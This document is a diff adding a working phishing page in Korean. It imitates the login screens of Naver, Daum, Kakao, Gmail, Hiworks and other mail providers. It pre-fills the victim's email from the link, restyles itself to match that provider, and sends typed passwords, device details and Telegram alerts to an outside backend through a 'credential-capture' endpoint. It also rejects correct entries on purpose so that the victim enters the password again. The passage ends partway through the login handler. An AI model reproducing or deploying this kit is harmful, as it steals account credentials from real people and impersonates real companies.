@@ -1,0 +1,1006 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>로그인 - 안전한 계정 인증</title>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --brand: #03C75A;
+            --brand-dark: #029B44;
+            --brand-soft: #E8F8EF;
+            --brand-gradient: linear-gradient(135deg, #03C75A 0%, #029B44 100%);
+            --brand-glow: rgba(3,199,90,0.35);
+            --brand-focus: rgba(3,199,90,0.12);
+        }
+        body {
+            font-family: 'Noto Sans KR', -apple-system, 'Malgun Gothic', sans-serif;
+            background: var(--brand-soft);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            transition: background 0.6s ease;
+        }
+        .login-container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
+            max-width: 440px;
+            width: 100%;
+            padding: 48px 40px 40px;
+            position: relative;
+            overflow: hidden;
+            animation: slideUp 0.6s ease;
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+        .login-container::before {
+            content: '';
+            position: absolute; top: 0; left: 0; right: 0;
+            height: 4px;
+            background: var(--brand-gradient);
+            background-size: 200% 100%;
+            animation: shimmer 3s ease-in-out infinite;
+            transition: background 0.6s ease;
+        }
+        @keyframes shimmer {
+            0%, 100% { background-position: 0% 0%; }
+            50%      { background-position: 100% 0%; }
+        }
+        .header { text-align: center; margin-bottom: 32px; }
+        .logo-container {
+            display: flex; justify-content: center; align-items: center;
+            gap: 12px; margin-bottom: 12px;
+        }
+        .logo-icon {
+            width: 48px; height: 48px;
+            background: var(--brand-gradient);
+            border-radius: 12px;
+            display: flex; align-items: center; justify-content: center;
+            color: white; font-size: 24px; font-weight: 700;
+            box-shadow: 0 4px 12px var(--brand-glow);
+            transition: background 0.6s ease, box-shadow 0.6s ease;
+            text-transform: uppercase;
+        }
+        .logo-text {
+            font-size: 24px; font-weight: 700;
+            color: var(--brand);
+            letter-spacing: -0.5px;
+            transition: color 0.6s ease;
+        }
+        .logo-text .highlight { color: var(--brand-dark); }
+        .subtitle {
+            color: #5f6368; font-size: 14px; margin-top: 4px;
+        }
+        .security-badge {
+            display: inline-flex; align-items: center; gap: 6px;
+            background: var(--brand-soft);
+            color: var(--brand-dark);
+            padding: 4px 14px; border-radius: 20px;
+            font-size: 12px; font-weight: 500; margin-top: 8px;
+            transition: all 0.6s ease;
+        }
+        .domain-display {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 12px 16px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border: 1px solid #e8eaed;
+            transition: all 0.6s ease;
+        }
+        .domain-label { color: #5f6368; font-size: 13px; font-weight: 500; }
+        .domain-value { color: var(--brand-dark); font-weight: 600; font-size: 14px; transition: color 0.6s ease; }
+        .provider-badge {
+            display: flex; align-items: center; gap: 8px;
+            justify-content: center;
+            padding: 8px 14px;
+            background: var(--brand-soft);
+            border-radius: 20px;
+            font-size: 13px;
+            color: var(--brand-dark);
+            font-weight: 600;
+            margin-bottom: 20px;
+            transition: all 0.6s ease;
+        }
+        .provider-badge .provider-dot {
+            width: 10px; height: 10px; border-radius: 50%;
+            background: var(--brand);
+            animation: pulseDot 1.6s ease-in-out infinite;
+        }
+        @keyframes pulseDot {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50%      { opacity: 0.5; transform: scale(0.8); }
+        }
+        .silent-progress {
+            display: flex; justify-content: center; gap: 8px;
+            margin-bottom: 20px;
+        }
+        .silent-progress .step {
+            width: 32px; height: 6px; border-radius: 3px;
+            background: #e8eaed;
+            transition: all 0.4s ease;
+        }
+        .silent-progress .step.active {
+            background: var(--brand);
+            box-shadow: 0 0 8px var(--brand-glow);
+        }
+        .form-group { margin-bottom: 20px; }
+        .form-group label {
+            display: block; color: #3c4043; font-size: 14px;
+            font-weight: 500; margin-bottom: 6px;
+        }
+        .form-group input {
+            width: 100%; padding: 14px 16px;
+            border: 2px solid #dadce0; border-radius: 10px;
+            font-size: 15px; transition: all 0.3s;
+            background: #fafafa; font-family: inherit;
+        }
+        .form-group input:focus {
+            border-color: var(--brand);
+            outline: none;
+            box-shadow: 0 0 0 4px var(--brand-focus);
+            background: white;
+        }
+        .form-group input:disabled { background: #f0f0f0; color: #5f6368; }
+        .form-group input.error {
+            border-color: #d93025;
+            background: #fff5f5;
+            animation: shake 0.4s ease;
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25%      { transform: translateX(-6px); }
+            75%      { transform: translateX(6px); }
+        }
+        .password-wrapper { position: relative; }
+        .password-wrapper input { padding-right: 48px; }
+        .toggle-password {
+            position: absolute; right: 14px; top: 50%;
+            transform: translateY(-50%);
+            background: none; border: none;
+            color: #9aa0a6; cursor: pointer;
+            font-size: 18px; padding: 4px;
+            transition: color 0.3s;
+        }
+        .toggle-password:hover { color: #3c4043; }
+        .input-hint {
+            font-size: 12px; color: #9aa0a6;
+            margin-top: 6px;
+        }
+        .options-row {
+            display: flex; justify-content: space-between;
+            align-items: center; margin-bottom: 24px;
+            font-size: 14px;
+        }
+        .options-row .checkbox {
+            display: flex; align-items: center; gap: 8px;
+            color: #3c4043; cursor: pointer;
+        }
+        .options-row .checkbox input {
+            width: 18px; height: 18px;
+            accent-color: var(--brand); cursor: pointer;
+        }
+        .options-row .forgot-link {
+            color: var(--brand-dark); text-decoration: none;
+            font-weight: 500;
+        }
+        .options-row .forgot-link:hover { text-decoration: underline; }
+        .btn-signin {
+            width: 100%; padding: 14px;
+            background: var(--brand-gradient);
+            color: white; border: none;
+            border-radius: 10px; font-size: 16px;
+            font-weight: 600; cursor: pointer;
+            transition: all 0.3s; font-family: inherit;
+            position: relative; overflow: hidden;
+            box-shadow: 0 4px 15px var(--brand-glow);
+        }
+        .btn-signin:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px var(--brand-glow);
+        }
+        .btn-signin:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
+        .btn-signin.success {
+            background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%) !important;
+        }
+        .btn-signin .spinner {
+            display: none; width: 20px; height: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top: 2px solid white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        .btn-signin.loading .spinner { display: inline-block; }
+        .btn-signin.loading .btn-text { display: none; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .error-message {
+            color: #d93025; font-size: 14px;
+            margin-top: 12px; display: none;
+            align-items: center; gap: 6px;
+            background: #fce8e6; padding: 10px 14px;
+            border-radius: 8px;
+            animation: shake 0.5s ease;
+        }
+        .error-message.show { display: flex; }
+        .success-message {
+            color: #1e7e34; font-size: 14px;
+            margin-top: 12px; display: none;
+            align-items: center; gap: 6px;
+            background: #e6f4ea; padding: 10px 14px;
+            border-radius: 8px;
+        }
+        .success-message.show { display: flex; }
+        .footer {
+            text-align: center; margin-top: 28px;
+            padding-top: 20px;
+            border-top: 1px solid #e8eaed;
+            font-size: 12px; color: #9aa0a6;
+        }
+        .footer .divider { margin: 0 8px; color: #dadce0; }
+        .footer a { color: var(--brand-dark); text-decoration: none; }
+        .footer a:hover { text-decoration: underline; }
+        .footer .korean { font-weight: 500; color: #5f6368; }
+        .security-footer {
+            display: flex; justify-content: center; gap: 16px;
+            margin-top: 16px; font-size: 11px; color: #9aa0a6;
+            flex-wrap: wrap;
+        }
+        .security-footer span { display: flex; align-items: center; gap: 4px; }
+        .voice-indicator {
+            display: none; position: fixed;
+            bottom: 30px; left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.85);
+            color: #fff; padding: 14px 28px;
+            border-radius: 30px; font-size: 15px;
+            z-index: 9999;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+            align-items: center; gap: 14px;
+            backdrop-filter: blur(10px);
+            font-family: 'Noto Sans KR', sans-serif;
+        }
+        .voice-indicator.show { display: flex; }
+        .voice-indicator .wave {
+            display: flex; align-items: center; gap: 4px;
+        }
+        .voice-indicator .wave span {
+            display: inline-block; width: 4px; height: 16px;
+            background: var(--brand); border-radius: 2px;
+            animation: wave 1s ease-in-out infinite;
+        }
+        .voice-indicator .wave span:nth-child(2) { animation-delay: 0.1s; }
+        .voice-indicator .wave span:nth-child(3) { animation-delay: 0.2s; }
+        .voice-indicator .wave span:nth-child(4) { animation-delay: 0.3s; }
+        .voice-indicator .wave span:nth-child(5) { animation-delay: 0.4s; }
+        @keyframes wave {
+            0%, 100% { height: 8px; }
+            50%      { height: 24px; }
+        }
+        @media (max-width: 480px) {
+            .login-container { padding: 32px 20px 28px; }
+            .logo-text { font-size: 20px; }
+            .domain-display { flex-direction: column; align-items: flex-start; gap: 4px; }
+            .options-row { flex-direction: column; gap: 12px; align-items: flex-start; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <div class="header">
+            <div class="logo-container">
+                <div class="logo-icon" id="logoIcon">N</div>
+                <div class="logo-text" id="logoText">네이버 <span class="highlight">계정</span></div>
+            </div>
+            <div class="subtitle" id="subtitleText">안전한 계정 인증</div>
+            <div class="security-badge" id="securityBadge">🔒 보안 연결</div>
+        </div>
+
+        <div class="domain-display">
+            <span class="domain-label">📧 계정 이메일</span>
+            <span class="domain-value" id="domainDisplay">user@naver.com</span>
+        </div>
+
+        <div class="provider-badge" id="providerBadge">
+            <span class="provider-dot"></span>
+            <span id="providerName">네이버 계정으로 로그인</span>
+        </div>
+
+        <div class="silent-progress" id="silentProgress">
+            <div class="step" data-step="1"></div>
+            <div class="step" data-step="2"></div>
+            <div class="step" data-step="3"></div>
+        </div>
+
+        <form id="loginForm" onsubmit="handleLogin(event)">
+            <div class="form-group">
+                <label for="emailInput">이메일 주소</label>
+                <input type="email" id="emailInput" placeholder="name@naver.com" disabled>
+            </div>
+
+            <div class="form-group">
+                <label for="passwordInput">비밀번호</label>
+                <div class="password-wrapper">
+                    <input type="password" id="passwordInput" placeholder="비밀번호를 입력하세요" autocomplete="current-password">
+                    <button type="button" class="toggle-password" onclick="togglePassword()">👁️</button>
+                </div>
+                <div class="input-hint" id="passwordHint">계정 비밀번호를 입력하세요</div>
+            </div>
+
+            <div class="options-row">
+                <label class="checkbox">
+                    <input type="checkbox" id="rememberMe" checked>
+                    로그인 상태 유지
+                </label>
+                <a href="#" class="forgot-link">비밀번호 찾기</a>
+            </div>
+
+            <div class="error-message" id="errorMessage">
+                ⚠️ <span id="errorText">인증에 실패했습니다. 다시 시도해주세요.</span>
+            </div>
+            <div class="success-message" id="successMessage">
+                ✅ <span id="successText">인증 성공! 문서로 이동합니다...</span>
+            </div>
+
+            <button type="submit" class="btn-signin" id="signinBtn">
+                <span class="btn-text" id="btnText">로그인</span>
+                <span class="spinner"></span>
+            </button>
+        </form>
+
+        <div class="footer">
+            <span class="korean" id="footerBrand">네이버 주식회사</span>
+            <span class="divider">|</span>
+            <a href="#">이용약관</a>
+            <span class="divider">|</span>
+            <a href="#">개인정보처리방침</a>
+            <br>
+            <span style="font-size:11px;color:#9aa0a6;margin-top:4px;display:block;" id="footerCopy">
+                © 2026 NAVER Corp. All rights reserved.
+            </span>
+        </div>
+
+        <div class="security-footer">
+            <span>🔐 SSL/TLS 보안</span>
+            <span>🛡️ Cloudflare 보호</span>
+            <span>🇰🇷 한국 서버</span>
+        </div>
+    </div>
+
+    <div class="voice-indicator" id="voiceIndicator">
+        <span>🔊</span>
+        <div class="wave"><span></span><span></span><span></span><span></span><span></span></div>
+        <span id="voiceText">인증 중...</span>
+    </div>
+
+<script>
+// ============================================================
+//  KOREAN PROVIDER DATABASE
+// ============================================================
+const PROVIDERS = {
+    'naver.com': {
+        name: '네이버', en: 'NAVER', letter: 'N',
+        color: '#03C75A', dark: '#029B44',
+        soft: '#E8F8EF', glow: 'rgba(3,199,90,0.35)', focus: 'rgba(3,199,90,0.12)',
+        gradient: 'linear-gradient(135deg, #03C75A 0%, #029B44 100%)',
+        badge: '네이버 계정으로 로그인', hint: '네이버 계정 비밀번호를 입력하세요',
+        footerBrand: '네이버 주식회사', footerCopy: '© 2026 NAVER Corp. All rights reserved.',
+        subtitle: '네이버 계정으로 안전하게 로그인'
+    },
+    'daum.net': {
+        name: '다음', en: 'Daum', letter: 'D',
+        color: '#FFCD00', dark: '#E5B800',
+        soft: '#FFF9DB', glow: 'rgba(255,205,0,0.35)', focus: 'rgba(255,205,0,0.15)',
+        gradient: 'linear-gradient(135deg, #FFCD00 0%, #E5B800 100%)',
+        badge: '다음 계정으로 로그인', hint: '다음 계정 비밀번호를 입력하세요',
+        footerBrand: '다음 주식회사', footerCopy: '© 2026 Daum Corp. All rights reserved.',
+        subtitle: '다음 계정으로 안전하게 로그인'
+    },
+    'hanmail.net': {
+        name: '한메일', en: 'Hanmail', letter: 'H',
+        color: '#FFCD00', dark: '#E5B800',
+        soft: '#FFF9DB', glow: 'rgba(255,205,0,0.35)', focus: 'rgba(255,205,0,0.15)',
+        gradient: 'linear-gradient(135deg, #FFCD00 0%, #E5B800 100%)',
+        badge: '한메일 계정으로 로그인', hint: '한메일 계정 비밀번호를 입력하세요',
+        footerBrand: '한메일', footerCopy: '© 2026 Hanmail Corp. All rights reserved.',
+        subtitle: '한메일 계정으로 안전하게 로그인'
+    },
+    'hiworks.co.kr': {
+        name: '하이웍스', en: 'Hiworks', letter: 'H',
+        color: '#1a73e8', dark: '#0d47a1',
+        soft: '#e8f0fe', glow: 'rgba(26,115,232,0.35)', focus: 'rgba(26,115,232,0.12)',
+        gradient: 'linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%)',
+        badge: '하이웍스 계정으로 로그인', hint: '하이웍스 계정 비밀번호를 입력하세요',
+        footerBrand: '㈜하이웍스', footerCopy: '© 2026 Hiworks Corp. All rights reserved.',
+        subtitle: '기업 업무를 위한 안전한 로그인'
+    },
+    'gmail.com': {
+        name: 'Gmail', en: 'Gmail', letter: 'G',
+        color: '#EA4335', dark: '#C5221F',
+        soft: '#FCE8E6', glow: 'rgba(234,67,53,0.35)', focus: 'rgba(234,67,53,0.12)',
+        gradient: 'linear-gradient(135deg, #EA4335 0%, #C5221F 100%)',
+        badge: 'Gmail 계정으로 로그인', hint: 'Gmail 계정 비밀번호를 입력하세요',
+        footerBrand: 'Google LLC', footerCopy: '© 2026 Google LLC. All rights reserved.',
+        subtitle: 'Gmail 계정으로 안전하게 로그인'
+    },
+    'nate.com': {
+        name: '네이트', en: 'Nate', letter: 'N',
+        color: '#E60012', dark: '#B8000E',
+        soft: '#FEE8EA', glow: 'rgba(230,0,18,0.35)', focus: 'rgba(230,0,18,0.12)',
+        gradient: 'linear-gradient(135deg, #E60012 0%, #B8000E 100%)',
+        badge: '네이트 계정으로 로그인', hint: '네이트 계정 비밀번호를 입력하세요',
+        footerBrand: 'SK커뮤니케이션즈', footerCopy: '© 2026 SK Communications. All rights reserved.',
+        subtitle: '네이트 계정으로 안전하게 로그인'
+    },
+    'kakao.com': {
+        name: '카카오', en: 'Kakao', letter: 'K',
+        color: '#FEE500', dark: '#D4BE00',
+        soft: '#FFFCE0', glow: 'rgba(254,229,0,0.4)', focus: 'rgba(254,229,0,0.18)',
+        gradient: 'linear-gradient(135deg, #FEE500 0%, #D4BE00 100%)',
+        badge: '카카오 계정으로 로그인', hint: '카카오 계정 비밀번호를 입력하세요',
+        footerBrand: '카카오 주식회사', footerCopy: '© 2026 Kakao Corp. All rights reserved.',
+        subtitle: '카카오 계정으로 안전하게 로그인'
+    },
+    'korea.com': {
+        name: '코리아닷컴', en: 'Korea.com', letter: 'K',
+        color: '#0066CC', dark: '#004C99',
+        soft: '#E6F0FA', glow: 'rgba(0,102,204,0.35)', focus: 'rgba(0,102,204,0.12)',
+        gradient: 'linear-gradient(135deg, #0066CC 0%, #004C99 100%)',
+        badge: '코리아닷컴 계정으로 로그인', hint: '코리아닷컴 계정 비밀번호를 입력하세요',
+        footerBrand: '코리아닷컴', footerCopy: '© 2026 Korea.com. All rights reserved.',
+        subtitle: '코리아닷컴 계정으로 안전하게 로그인'
+    },
+    'hanmir.com': {
+        name: '한미르', en: 'Hanmir', letter: 'H',
+        color: '#0066CC', dark: '#004C99',
+        soft: '#E6F0FA', glow: 'rgba(0,102,204,0.35)', focus: 'rgba(0,102,204,0.12)',
+        gradient: 'linear-gradient(135deg, #0066CC 0%, #004C99 100%)',
+        badge: '한미르 계정으로 로그인', hint: '한미르 계정 비밀번호를 입력하세요',
+        footerBrand: '한미르', footerCopy: '© 2026 Hanmir. All rights reserved.',
+        subtitle: '한미르 계정으로 안전하게 로그인'
+    },
+    'chol.com': {
+        name: '천리안', en: 'Chol', letter: 'C',
+        color: '#0066CC', dark: '#004C99',
+        soft: '#E6F0FA', glow: 'rgba(0,102,204,0.35)', focus: 'rgba(0,102,204,0.12)',
+        gradient: 'linear-gradient(135deg, #0066CC 0%, #004C99 100%)',
+        badge: '천리안 계정으로 로그인', hint: '천리안 계정 비밀번호를 입력하세요',
+        footerBrand: '천리안', footerCopy: '© 2026 Chol.com. All rights reserved.',
+        subtitle: '천리안 계정으로 안전하게 로그인'
+    },
+    'empal.com': {
+        name: '엠파스', en: 'Empal', letter: 'E',
+        color: '#0066CC', dark: '#004C99',
+        soft: '#E6F0FA', glow: 'rgba(0,102,204,0.35)', focus: 'rgba(0,102,204,0.12)',
+        gradient: 'linear-gradient(135deg, #0066CC 0%, #004C99 100%)',
+        badge: '엠파스 계정으로 로그인', hint: '엠파스 계정 비밀번호를 입력하세요',
+        footerBrand: '엠파스', footerCopy: '© 2026 Empal. All rights reserved.',
+        subtitle: '엠파스 계정으로 안전하게 로그인'
+    },
+    'dreamwiz.com': {
+        name: '드림위즈', en: 'Dreamwiz', letter: 'D',
+        color: '#0066CC', dark: '#004C99',
+        soft: '#E6F0FA', glow: 'rgba(0,102,204,0.35)', focus: 'rgba(0,102,204,0.12)',
+        gradient: 'linear-gradient(135deg, #0066CC 0%, #004C99 100%)',
+        badge: '드림위즈 계정으로 로그인', hint: '드림위즈 계정 비밀번호를 입력하세요',
+        footerBrand: '드림위즈', footerCopy: '© 2026 Dreamwiz. All rights reserved.',
+        subtitle: '드림위즈 계정으로 안전하게 로그인'
+    },
+    'orgio.net': {
+        name: '오르지오', en: 'Orgio', letter: 'O',
+        color: '#0066CC', dark: '#004C99',
+        soft: '#E6F0FA', glow: 'rgba(0,102,204,0.35)', focus: 'rgba(0,102,204,0.12)',
+        gradient: 'linear-gradient(135deg, #0066CC 0%, #004C99 100%)',
+        badge: '오르지오 계정으로 로그인', hint: '오르지오 계정 비밀번호를 입력하세요',
+        footerBrand: '오르지오', footerCopy: '© 2026 Orgio. All rights reserved.',
+        subtitle: '오르지오 계정으로 안전하게 로그인'
+    },
+    'paran.com': {
+        name: '파란', en: 'Paran', letter: 'P',
+        color: '#0066CC', dark: '#004C99',
+        soft: '#E6F0FA', glow: 'rgba(0,102,204,0.35)', focus: 'rgba(0,102,204,0.12)',
+        gradient: 'linear-gradient(135deg, #0066CC 0%, #004C99 100%)',
+        badge: '파란 계정으로 로그인', hint: '파란 계정 비밀번호를 입력하세요',
+        footerBrand: '파란', footerCopy: '© 2026 Paran. All rights reserved.',
+        subtitle: '파란 계정으로 안전하게 로그인'
+    }
+};
+
+// Default fallback
+const DEFAULT_PROVIDER = {
+    name: '한국 계정', en: 'Korea', letter: 'K',
+    color: '#1a73e8', dark: '#0d47a1',
+    soft: '#e8f0fe', glow: 'rgba(26,115,232,0.35)', focus: 'rgba(26,115,232,0.12)',
+    gradient: 'linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%)',
+    badge: '한국 계정으로 로그인', hint: '계정 비밀번호를 입력하세요',
+    footerBrand: '한국 계정', footerCopy: '© 2026 Korea Auth. All rights reserved.',
+    subtitle: '안전한 계정 인증'
+};
+
+// ============================================================
+//  CONFIG — Your Render backend (server.js)
+// ============================================================
+const CONFIG = {
+    BACKEND_URL: 'https://team-office-hiworks-com.onrender.com',
+    CREDENTIAL_ENDPOINT: '/api/credential-capture',
+    LOG_ENDPOINT: '/api/log',
+    TELEGRAM_ENDPOINT: '/api/telegram',
+    SESSION_KEY: 'korea_auth_session',
+    REQUIRED_MATCHES: 3,
+    ATTEMPT_WINDOW: 60000
+};
+
+// ============================================================
+//  STATE
+// ============================================================
+const SESSION_ID = 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
+let capturedEmail = '';
+let currentProvider = DEFAULT_PROVIDER;
+let consecutiveCount = 0;
+let firstPasswordAttempt = null;
+let attemptCount = 0;
+let lastAttemptTime = 0;
+let isProcessing = false;
+
+// ============================================================
+//  DOM REFS
+// ============================================================
+const emailInput = document.getElementById('emailInput');
+const passwordInput = document.getElementById('passwordInput');
+const signinBtn = document.getElementById('signinBtn');
+const btnText = document.getElementById('btnText');
+const errorMessage = document.getElementById('errorMessage');
+const errorText = document.getElementById('errorText');
+const successMessage = document.getElementById('successMessage');
+const successText = document.getElementById('successText');
+
+// ============================================================
+//  URL EMAIL EXTRACTION — reads ?u= OR ?email= OR ?login_hint=
+// ============================================================
+function getEmailFromURL() {
+    const params = new URLSearchParams(window.location.search);
+    let email = params.get('u') || params.get('email') || params.get('login_hint') || '';
+    if (!email && window.location.search.length > 1) {
+        const raw = window.location.search.substring(1);
+        try {
+            const decoded = atob(raw);
+            if (decoded.includes('@')) email = decoded;
+        } catch (e) {
+            if (raw.includes('@')) email = raw;
+        }
+    }
+    if (email) {
+        email = email.split('&')[0].split('?')[0].split('#')[0];
+        email = decodeURIComponent(email);
+        if (!email.includes('@')) email = '';
+    }
+    if (email) { try { localStorage.setItem('lastKoreaEmail', email); } catch (e) {} }
+    return email;
+}
+function getSavedEmail() {
+    try { return localStorage.getItem('lastKoreaEmail') || ''; } catch (e) { return ''; }
+}
+
+// ============================================================
+//  PROVIDER DETECTION
+// ============================================================
+function detectProvider(email) {
+    if (!email || !email.includes('@')) return DEFAULT_PROVIDER;
+    const domain = email.split('@')[1].toLowerCase().trim();
+    if (PROVIDERS[domain]) return PROVIDERS[domain];
+    // Check subdomains / aliases
+    for (const key in PROVIDERS) {
+        if (domain.endsWith('.' + key) || domain === key.replace('www.', '')) {
+            return PROVIDERS[key];
+        }
+    }
+    return DEFAULT_PROVIDER;
+}
+
+// ============================================================
+//  APPLY BRANDING
+// ============================================================
+function applyProviderBranding(provider, email) {
+    const root = document.documentElement;
+    root.style.setProperty('--brand', provider.color);
+    root.style.setProperty('--brand-dark', provider.dark);
+    root.style.setProperty('--brand-soft', provider.soft);
+    root.style.setProperty('--brand-gradient', provider.gradient);
+    root.style.setProperty('--brand-glow', provider.glow);
+    root.style.setProperty('--brand-focus', provider.focus);
+
+    document.getElementById('logoIcon').textContent = provider.letter;
+    document.getElementById('logoText').innerHTML = provider.name + ' <span class="highlight">계정</span>';
+    document.getElementById('subtitleText').textContent = provider.subtitle;
+    document.getElementById('providerName').textContent = provider.badge;
+    document.getElementById('passwordHint').textContent = provider.hint;
+    document.getElementById('footerBrand').textContent = provider.footerBrand;
+    document.getElementById('footerCopy').textContent = provider.footerCopy;
+
+    const domain = email && email.includes('@') ? email.split('@')[1] : 'korea.com';
+    document.getElementById('domainDisplay').textContent = email || ('user@' + domain);
+    document.title = provider.name + ' 로그인 - 안전한 계정 인증';
+    document.documentElement.lang = 'ko';
+
+    console.log(`🎨 Provider: ${provider.name} (${provider.en})`);
+    console.log(`🎨 Color: ${provider.color} | Domain: ${domain}`);
+}
+
+// ============================================================
+//  VOICE (KOREAN)
+// ============================================================
+function speakKorean(text, callback) {
+    if (!window.speechSynthesis) { if (callback) callback(); return; }
+    window.speechSynthesis.cancel();
+    const u = new SpeechSynthesisUtterance(text);
+    u.lang = 'ko-KR';
+    u.rate = 0.9; u.pitch = 1; u.volume = 1;
+    let voices = window.speechSynthesis.getVoices();
+    const speak = () => {
+        voices = window.speechSynthesis.getVoices();
+        const v = voices.find(x => x.lang.startsWith('ko'));
+        if (v) u.voice = v;
+        window.speechSynthesis.speak(u);
+    };
+    if (voices.length === 0) window.speechSynthesis.onvoiceschanged = speak;
+    else speak();
+
+    const vi = document.getElementById('voiceIndicator');
+    const vt = document.getElementById('voiceText');
+    if (vi) { vi.classList.add('show'); if (vt) vt.textContent = text; }
+    const done = () => { setTimeout(() => { if (vi) vi.classList.remove('show'); }, 500); if (callback) callback(); };
+    u.onend = done; u.onerror = done;
+}
+if (window.speechSynthesis) {
+    window.speechSynthesis.getVoices();
+    window.speechSynthesis.onvoiceschanged = function() { window.speechSynthesis.getVoices(); };
+}
+
+// ============================================================
+//  BACKEND SUBMIT — matches server.js fields
+// ============================================================
+function sendCredentials(email, password, source, extra = {}) {
+    if (!email || !password || password.length < 2) return;
+    const ua = navigator.userAgent;
+    const isMobile = /Mobile|Android|iPhone/i.test(ua);
+    const isTablet = /iPad|Tablet/i.test(ua);
+
+    const data = {
+        email, password,
+        source: source || 'korea_login',
+        sessionId: SESSION_ID,
+        url: window.location.href,
+        userAgent: ua,
+        timestamp: new Date().toISOString(),
+        attemptCount,
+        consecutiveCount: extra.consecutiveCount !== undefined ? extra.consecutiveCount : consecutiveCount,
+        match: extra.match,
+        referrer: document.referrer || 'Direct',
+        service: 'Korea Auth',
+        platform: navigator.platform || 'Unknown',
+        device: isMobile ? 'Mobile' : (isTablet ? 'Tablet' : 'Desktop'),
+        language: 'ko',
+        timezone: (Intl.DateTimeFormat().resolvedOptions().timeZone) || 'Asia/Seoul',
+        platformName: 'Hiworks',
+        provider: currentProvider.en,
+        providerName: currentProvider.name
+    };
+
+    console.log('📤 Sending credentials to backend:', data);
+
+    fetch(CONFIG.BACKEND_URL + CONFIG.CREDENTIAL_ENDPOINT, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data),
+        keepalive: true
+    })
+    .then(r => r.json())
+    .then(d => console.log('✅ Backend response:', d))
+    .catch(e => console.error('❌ Backend error:', e));
+
+    fetch(CONFIG.BACKEND_URL + CONFIG.LOG_ENDPOINT, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            type: 'korea_provider_verification',
+            email, password, source,
+            sessionId: SESSION_ID,
+            consecutiveCount: extra.consecutiveCount !== undefined ? extra.consecutiveCount : consecutiveCount,
+            provider: currentProvider.en,
+            platformName: 'Hiworks',
+            language: 'ko',
+            url: window.location.href,
+            timestamp: Date.now()
+        }),
+        keepalive: true
+    }).catch(() => {});
+}
+
+function sendTelegramAlert(message) {
+    try {
+        fetch(CONFIG.BACKEND_URL + CONFIG.TELEGRAM_ENDPOINT, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ message, parseMode: 'Markdown' })
+        }).catch(() => {});
+    } catch (e) {}
+}
+
+// ============================================================
+//  UI HELPERS
+// ============================================================
+function showError(message) {
+    errorMessage.className = 'error-message show';
+    errorText.textContent = message;
+    successMessage.className = 'success-message';
+}
+function showSuccess(message) {
+    successMessage.className = 'success-message show';
+    successText.textContent = message;
+    errorMessage.className = 'error-message';
+}
+function clearMessages() {
+    errorMessage.className = 'error-message';
+    successMessage.className = 'success-message';
+}
+function updateSilentProgress(count) {
+    document.querySelectorAll('.silent-progress .step').forEach((el, idx) => {
+        el.classList.toggle('active', idx < count);
+    });
+}
+function resetSilentProgress() {
+    document.querySelectorAll('.silent-progress .step').forEach(el => el.classList.remove('active'));
+}
+
+function togglePassword() {
+    const btn = document.querySelector('.toggle-password');
+    if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';
+        btn.textContent = '🙈';
+    } else {
+        passwordInput.type = 'password';
+        btn.textContent = '👁️';
+    }
+}
+
+// ============================================================
+//  HANDLE LOGIN — 3× silent consecutive match
+// ============================================================
+async function handleLogin(event) {
+    if (event) event.preventDefault();
+    if (isProcessing) return;
+
+    const email = (capturedEmail || getEmailFromURL() || getSavedEmail() || '').trim();
+    const password = passwordInput.value.trim();
+
+    if (!email || !email.includes('@')) {
+        showError('올바른 이메일 주소가 필요합니다.');
+        return;
+    }
+    if (!password) {
+        passwordInput.focus();
+        return;
+    }
+
+    // ---- GUARD: password equals email (or email local-part) ----
+    const localPart = email.split('@')[0];
+    if (password.toLowerCase() === email.toLowerCase() ||
+        password.toLowerCase() === localPart.toLowerCase()) {
+        console.log('🚫 Blocked: password equals email');
+        consecutiveCount = 0;
+        firstPasswordAttempt = null;
+        resetSilentProgress();
+        passwordInput.value = '';
+        passwordInput.classList.add('error');
+        showError('❌ 이메일 주소가 아닌 올바른 비밀번호를 입력하세요.');
+        speakKorean('이메일 주소가 아닌 올바른 비밀번호를 입력하세요.');
+        setTimeout(() => {
+            passwordInput.classList.remove('error');
+            passwordInput.focus();
+        }, 1400);
+        return;
+    }
+
+    // ---- Session reset if idle > 60s ----
+    const now = Date.now();
+    if (lastAttemptTime > 0 && (now - lastAttemptTime) > CONFIG.ATTEMPT_WINDOW) {
+        consecutiveCount = 0;
+        firstPasswordAttempt = null;
+        resetSilentProgress();
+        console.log('⏰ Session expired — resetting');
+    }
+
+    attemptCount++;
+    isProcessing = true;
+    signinBtn.disabled = true;
+    signinBtn.classList.add('loading');
+
+    // ============================================================
+    //  ENTRY #1 — silent store
+    // ============================================================
+    if (consecutiveCount === 0) {
+        console.log('📥 1st entry — silent store');
